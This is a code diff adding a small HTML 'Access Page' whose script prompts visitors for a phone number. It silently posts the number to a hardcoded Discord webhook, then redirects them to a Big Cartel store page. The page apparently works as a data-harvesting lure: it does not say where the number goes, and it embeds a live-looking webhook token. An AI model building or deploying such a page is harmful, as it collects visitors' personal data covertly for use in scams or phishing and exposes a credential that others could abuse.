@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Access Page</title>
+  <style>
+    :root {
+      color-scheme: light dark;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+      background-color: #f5f5f5;
+      margin: 0;
+    }
+    h1 {
+      margin-bottom: 24px;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 1.1rem;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: opacity .2s ease;
+    }
+    button[disabled] {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .msg {
+      margin-top: 16px;
+      font-size: 0.95rem;
+    }
+  </style>
+</head>
+<body>
+  <h1>Click to Continue</h1>
+  <button id="enterBtn">Enter Phone Number</button>
+  <div id="msg" class="msg"></div>
+
+  <script>
+    const enterBtn = document.getElementById('enterBtn');
+    const msgBox = document.getElementById('msg');
+
+    enterBtn.addEventListener('click', startFlow);
+
+    async function startFlow() {
+      const input = prompt("Enter your phone number (5 to 15 digits):");
+      if (input === null) return; // user cancelled
+
+      if (!/^\d{5,15}$/.test(input)) {
+        alert("Invalid phone number. Please enter 5 to 15 digits (numbers only).");
+        return;
+      }
+
+      const webhookURL = "https://discord.com/api/webhooks/1303836849391013919/CslV2m7VZ6OFMCJeOicogBJBHAFKyNH8THk1_Ca1v2C41veYrZpuOD9GegiJMOLiuHNj";
+      const payload = { content: `Entered number: ${input}` };
+
+      try {
+        enterBtn.disabled = true;
+        msgBox.textContent = "Sending...";
+        const res = await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (!res.ok) {
+          throw new Error(`Webhook returned ${res.status}`);
+        }
+
+        msgBox.textContent = "Success! Redirecting...";
+        window.location.href = "https://my.bigcartel.com/products";
+      } catch (err) {
+        console.error(err);
+        alert("Webhook failed. Try again.");
+        msgBox.textContent = "Failed to send. Please try again.";
+      } finally {
+        enterBtn.disabled = false;
+      }
+    }
+  </script>
+</body>
+</html>
